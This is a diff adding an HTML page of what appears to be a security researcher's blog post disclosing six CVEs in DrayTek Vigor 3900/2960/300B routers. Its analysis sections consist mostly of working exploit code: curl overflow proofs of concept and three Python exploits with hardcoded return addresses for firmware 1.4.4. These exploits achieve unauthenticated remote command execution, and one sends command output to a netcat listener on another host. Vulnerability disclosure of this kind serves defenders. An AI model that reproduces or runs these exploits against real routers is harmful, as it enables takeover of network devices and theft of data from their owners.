@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.27.1" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="//fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/rainbow.min.css">
+<link rel="stylesheet" href="/css/normalize.css">
+<link rel="stylesheet" href="/css/skeleton.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="alternate" href="/index.xml" type="application/rss+xml" title="slashd.ga">
+<title>Draytek Vulnerabilities - slashd.ga</title>
+</head>
+<body>
+
+<div class="container">
+
+	<header role="banner">
+		<div class="header-logo">
+			<a href="/"><img src="/images/logo.png" width="60" height="60" alt="slashd.ga"></a>
+		</div>
+		
+	</header>
+
+
+	<main role="main">
+	<article itemscope itemtype="http://schema.org/BlogPosting"> 
+			<h1 class="entry-title" itemprop="headline">Draytek Vulnerabilities</h1>
+			<span class="entry-meta"><time itemprop="datePublished" datetime="2020-03-25">March 25, 2020</time></span>
+			
+
+<h1 id="draytek-vigor-3900-2960-300b-vulnerabilities">DrayTek Vigor 3900/2960/300B Vulnerabilities</h1>
+
+<hr />
+
+<p>I have found six vulnerabilities in DrayTek routers in the end of 2019 year. In this post I&rsquo;ll describe all of them.</p>
+
+<h2 id="which-numbers-were-assigned">Which numbers were assigned</h2>
+
+<ul>
+<li><strong>CVE-2020-10823</strong>
+Stack-based buffer overflow in <code>/cgi-bin/activate.cgi</code> through <code>var</code> variable. The vulnerability allows to execute code by remote unauthorized attacker.</li>
+<li><strong>CVE-2020-10824</strong>
+Stack-based buffer overflow in <code>/cgi-bin/activate.cgi</code> through <code>ticket</code> variable. The vulnerability allows to execute code by remote unauthorized attacker.</li>
+<li><strong>CVE-2020-10825</strong>
+Stack-based buffer overflow in <code>/cgi-bin/activate.cgi</code> through base64-decoding <code>ticket</code> variable. The vulnerability allows to execute code by remote unauthorized attacker.</li>
+<li><strong>CVE-2020-10826</strong>
+Command-injection in <code>/cgi-bin/activate.cgi</code> in <code>DEBUG</code> mode. The vulnerability allows to execute system command by remote unauthorized attacker if device works in <code>DEBUG</code> mode</li>
+<li><strong>CVE-2020-10827</strong>
+Stack-based buffer overflow in <code>apmd</code> service. The vulnerability allows to execute remote code by unauthorized attacker.</li>
+<li><strong>CVE-2020-10828</strong>
+Stack-based buffer overflow in <code>cvmd</code> service. The vulnerability allows to execute remote code by unauthorized attacker.</li>
+</ul>
+
+<h2 id="analyse-vulnerabilities">Analyse vulnerabilities</h2>
+
+<h3 id="cve-2020-10823-and-cve-2020-10824">CVE-2020-10823 and CVE-2020-10824</h3>
+
+<p>There are two vulnerabilities quite similar. <code>/cgi-bin/activate.cgi</code> accepts four parameters: <code>action</code>, <code>var</code>, <code>ticket</code> and <code>mac</code> (Figure 1).<img src="/static/draytek/get_var_n_ticket.PNG" alt="Figure 1. Accepts ticket and var." /> Both vulnerabilities are stack-base buffer overflows while copying user parameters <code>var</code> and <code>ticket</code> to static buffer (Figure 2). <img src="/static/draytek/memcpy_var_n_ticket.PNG" alt="Figure 1. Accepts ticket and var" />.Simple pseudo-code:</p>
+
+<pre><code class="language-C">...
+char static_buf_var[0x10];
+char static_buf_ticket[0x200];
+...
+int param_var_len = strlen(param_var);
+memcpy(static_buf_var, param_var, param_var_len);
+...
+int param_ticket_len = strlen(param_ticket);
+memcpy(static_buf_ticket, param_ticket, param_ticket_len);
+...
+</code></pre>
+
+<p>PoC:</p>
+
+<pre><code class="language-bash">$ curl -d &quot;var=`perl -e 'print &quot;A&quot; x 0x1000'`&amp;ticket=1&amp;mac=001122334455&quot; -X POST http://192.168.0.250/cgi-bin/activate.cgi
+$ curl -d &quot;ticket=`perl -e 'print &quot;A&quot; x 0x1000'`&amp;var=1&amp;mac=001122334455&quot; -X POST http://192.168.0.250/cgi-bin/activate.cgi
+</code></pre>
+
+<h3 id="cve-2020-10825">CVE-2020-10825</h3>
+
+<p><code>/cgi-bin/activate.cgi</code> has unathorized stack buffer overflow while does base64_decode operation at <code>ticket</code> parameter.
+Vulnerable function is <code>sub_F274</code> (<code>base64_decode</code>). <code>sub_F274</code> takes 3 parameters:
+1. Input base64 string (<code>ticket</code>)
+2. Input base64 string length
+3. Pointer to the output buffer.</p>
+
+<p>Caller function sets 3rd paramter as static stack buffer with size 0x200 (Figure 3). ![Figure 3. Calling vulnerabile function.](/static/draytek/call_base64_decode.PNG
+So if we give buffer more than 0x200 bytes while decoding base64 data it will corrupt the stack.</p>
+
+<p>Exploit for Vigor3900 (1.4.4):</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+
+__author__ = 'Valentin &quot;slashd&quot; Shilnenkov'
+
+import os
+import sys
+import ssl
+import base64
+import socket
+
+from struct import pack,unpack
+
+def gen_postdata():
+    buf = b'A' * 0x200
+    buf += pack(&quot;&lt;I&quot;, 0x41414141) # R4
+
+    # pointer to the HTTP_REFERER 1.4.4
+    buf += pack(&quot;&lt;I&quot;, 0x0001D7E4) # R5
+
+    buf += b'D' * 4 # R6
+    buf += b'E' * 4 # R7
+    buf += b'F' * 4 # R8
+
+    # 1.4.4
+    # .text:000093B0 05 00 A0 E1     MOV     R0, R5      ; command
+    # .text:000093B4 A7 FE FF EB     BL      system
+    buf += pack(&quot;&lt;I&quot;, 0x000093B0) # LR
+
+    # if action is set then Referer header
+    # will be saved at static address in .bss
+    payload = 'action=aaaaa&amp;'
+
+    payload += 'mac=000000000000&amp;var=qwertasdfgzxcvby&amp;ticket='
+    payload = payload.encode() + base64.b64encode(buf)
+
+    print(payload)
+    return payload
+
+def create_connect_ssl(ip, port):
+    conn = ssl.wrap_socket(socket.socket(socket.AF_INET))
+    conn.connect((ip, port))
+    return conn
+
+def create_connect(ip, port):
+    s = socket.create_connection((ip,port))
+    return s
+
+
+def make_http_req(cmd):
+    postdata = gen_postdata()
+    req = &quot;POST /cgi-bin/activate.cgi HTTP/1.1\r\n&quot;
+    req += &quot;Host: 192.168.0.250\r\n&quot;
+    req += &quot;Referer: %s\r\n&quot; % cmd
+    req += &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n&quot;
+    req += &quot;Accept: */*\r\n&quot;
+    req += &quot;Accept-Language: en-US,en;q=0.5\r\n&quot;
+    req += &quot;Accept-Encoding: gzip, deflate\r\n&quot;
+    req += &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;
+    req += &quot;Content-Length: %d\r\n&quot; % len(postdata)
+    req += &quot;Connection: close\r\n\r\n&quot;
+    req += postdata.decode()
+    return req
+
+
+
+def main(ip, addr):
+    # to enable command injection:
+    data = make_http_req('uci${IFS}set${IFS}fw_cf_license.fwlicense.debug=true')
+    s = create_connect(ip, addr)
+    print(data)
+    s.send(data.encode())
+    print(s.recv(10240))
+
+if __name__ == '__main__':
+    main('192.168.0.250', 8888)
+</code></pre>
+
+<h3 id="cve-2020-10826">CVE-2020-10826</h3>
+
+<p><code>/cgi-bin/activate.cgi</code> has unathorized command injection in <code>DEBUG</code> mode. For activating <code>DEBUG</code> mode need to execute command:</p>
+
+<pre><code class="language-bash">$ uci set fw_cf_license.fwlicense.debug=true
+</code></pre>
+
+<p>After that activate.cgi will be logging debug data to log file through bash commands in some places. For example:</p>
+
+<pre><code class="language-asm">.text:00009E24 08 00 A0 E1     MOV     R0, buf_400h ; s
+.text:00009E28 BC 1E 9F E5     LDR     R1, =0x3FF  ; maxlen
+.text:00009E2C 98 2D 9F E5     LDR     R2, =aEchoActivateLi_0 ; &quot;echo \&quot;activate license debug 2  httpbu&quot;...
+.text:00009E30 7C 3D 9F E5     LDR     R3, =g_HTTP_REFERER
+.text:00009E34 00 50 8D E5     STR     R5, [SP]
+.text:00009E38 6F FC FF EB     BL      snprintf
+.text:00009E3C 08 00 A0 E1     MOV     R0, buf_400h ; command
+.text:00009E40 04 FC FF EB     BL      system
+</code></pre>
+
+<p>Exploit for Vigor3900 (1.4.4):</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+
+__author__ 'Valentin &quot;slashd&quot; Shilnenkov'
+
+import os
+import sys
+import ssl
+import base64
+import socket
+
+from struct import pack,unpack
+
+def gen_postdata():
+    payload = 'action=geturl'
+    return payload
+
+def create_connect_ssl(ip, port):
+    conn = ssl.wrap_socket(socket.socket(socket.AF_INET))
+    conn.connect((ip, port))
+    return conn
+
+def create_connect(ip, port):
+    s = socket.create_connection((ip,port))
+    return s
+
+def make_http_req(cmd):
+    postdata = gen_postdata()
+    req = &quot;POST /cgi-bin/activate.cgi HTTP/1.1\r\n&quot;
+    req += &quot;Host: 192.168.0.250\r\n&quot;
+    req += &quot;Referer: `%s`\r\n&quot; % cmd
+    req += &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n&quot;
+    req += &quot;Accept: */*\r\n&quot;
+    req += &quot;Accept-Language: en-US,en;q=0.5\r\n&quot;
+    req += &quot;Accept-Encoding: gzip, deflate\r\n&quot;
+    req += &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;
+    req += &quot;Content-Length: %d\r\n&quot; % len(postdata)
+    req += &quot;Connection: close\r\n\r\n&quot;
+    req += postdata
+    return req
+
+def exp():
+    # execute command and send result back
+    data = make_http_req('%s|nc${IFS}192.168.0.251${IFS}1337' % sys.argv[1])
+
+    s = create_connect('192.168.0.250', 8888)
+    s.send(data.encode())
+
+    res = s.recv(10240).decode()
+    return res
+
+def main():
+    res = exp()
+    # print(res)
+    i = 0
+    while 'Internal Server Error'  in res and i &lt; 5:
+        print('.')
+        res = exp()
+        i += 1
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<h3 id="cve-2020-10827-and-cve-2020-10828">CVE-2020-10827 and CVE-2020-10828</h3>
+
+<p><code>apmd</code> and <code>cvmd</code> have very similar vulnerability, because use same code-base. <code>apmd</code> and <code>cvmd</code> are simple web servers and have auth through Authorization Digest method. For triggering Authorization need to make query to the <code>/ACSServer/services/ACSServlet</code>. Stack-based buffer overflows occur while handles <code>Authorization</code> header in function at <code>sub_11FB8</code> (<code>cvmd</code> at Vigor 3900 1.4.4).
+Function <code>sub_11FB8</code> has 4 input parameters:
+1. Which key need extract from Authorization header (char *)
+2. Authorization header value.
+3. Output buffer.
+4. Outbut buffer length.</p>
+
+<p>Also, <code>sub_11FB8</code> has temp stack buffer size char[0x64] for value. If function has found value, the value copied to the temp stack buffer in 2 different pathes:</p>
+
+<pre><code class="language-asm">.text:00012070 07 40 65 E0     RSB             R4, R5, R7
+.text:00012074 04 20 A0 E1     MOV             R2, R4 ; n
+.text:00012078 05 10 A0 E1     MOV             R1, R5 ; src
+.text:0001207C 08 00 A0 E1     MOV             R0, stack_buf ; dest
+.text:00012080 E2 DF FF EB     BL              memcpy
+.text:00012084 88 20 8D E2     ADD             R2, SP, #0x88+var_s0
+.text:00012088 04 30 82 E0     ADD             R3, R2, R4
+.text:0001208C 84 60 43 E5     STRB            R6, [R3,#-0x84]
+</code></pre>
+
+<p>and</p>
+
+<pre><code class="language-asm">.text:000121E8 04 40 65 E0     RSB             R4, R5, R4
+.text:000121EC 04 20 A0 E1     MOV             R2, R4 ; n
+.text:000121F0 05 10 A0 E1     MOV             R1, R5 ; src
+.text:000121F4 08 00 A0 E1     MOV             R0, stack_buf ; dest
+.text:000121F8 84 DF FF EB     BL              memcpy
+.text:000121FC 88 20 8D E2     ADD             R2, SP, #0x88+var_s0
+.text:00012200 04 30 82 E0     ADD             R3, R2, R4
+.text:00012204 84 70 43 E5     STRB            R7, [R3,#-0x84]
+.text:00012208 A0 FF FF EA     B               loc_12090
+</code></pre>
+
+<p>In <code>R2</code> the strlen of the value.
+In <code>R1</code> the value.
+In <code>R0</code> the static stack-based buffer.</p>
+
+<p>Exploit for Vigor3900 1.4.4:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+
+__author__ = 'Valentin &quot;slashd&quot; Shilnenkov'
+
+import socket
+ip='192.168.0.204'
+port=2121
+# port=80
+
+def make_payload():
+    vulnbuf = 'touch /tmp/pwned|'
+    vulnbuf += 'a' * (0x84 - len(vulnbuf))
+    vulnbuf += 'bbbb' # R4
+    vulnbuf += 'cccc' # R5
+    vulnbuf += 'dddd' # R6
+    vulnbuf += 'eeee' # R7
+    vulnbuf += 'ffff' # R8
+    vulnbuf += 'gggg' # R9
+    vulnbuf += 'hhhh' # R10
+    vulnbuf += '\xd0\xce' # PC
+    # will be called the system function
+    # at the R0 register our buffer
+    payload = &quot;GET /ACSServer/services/ACSServlet HTTP/1.1\r\n&quot;
+    payload += &quot;Host: 192.168.1.1:2020\r\n&quot;
+    payload += &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n&quot;
+    payload += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;
+    payload += &quot;Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n&quot;
+    payload += &quot;Accept-Encoding: gzip, deflate\r\n&quot;
+    payload += &quot;Connection: close\r\n&quot;
+    payload += &quot;Cookie: traffic_warning_0=2019.5:1\r\n&quot;
+    payload += 'Authorization: Digest username=&quot;admin&quot;, realm=&quot;CVM Server&quot;, nonce=&quot;MDAwMTRiN2I6RHJheXRlaw==&quot;, uri=&quot;/ACSServer/services/ACSServlet&quot;, algorithm=MD5, response=%s, qop=auth, nc=00000001, cnonce=&quot;7cb8eb1698646279&quot;\r\n\r\n' % vulnbuf
+
+    return payload
+
+def pwn():
+	p=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	p.connect((ip,port))
+	p.send(make_payload().encode())
+	p.close()
+
+if __name__ == '__main__':
+    pwn()
+</code></pre>
+
+	</article>
+	</main>
+
+
+	<footer role="contentinfo">
+		<div class="hr"></div>
+		<div class="footer-container">
+			<div class="copyright">Valentin Shilnenkov</div>
+			<div class="footer-link">
+				
+				  <a href="mailto:need.coffee@yandex.ru"><img class="icon" src="/images/email.svg"/ alt="email"></a>
+				
+				
+				
+				
+				  <a href="https://github.com/nixerr/" target="_blank"><img class="icon" src="/images/github.svg"/></a>
+				
+				
+			</div>
+		</div>
+	</footer>
+
+</div>
+
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/cmake.min.js" defer></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js" defer></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js" defer></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/cpp.min.js" defer></script>
+  
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+</body>
+</html>
+
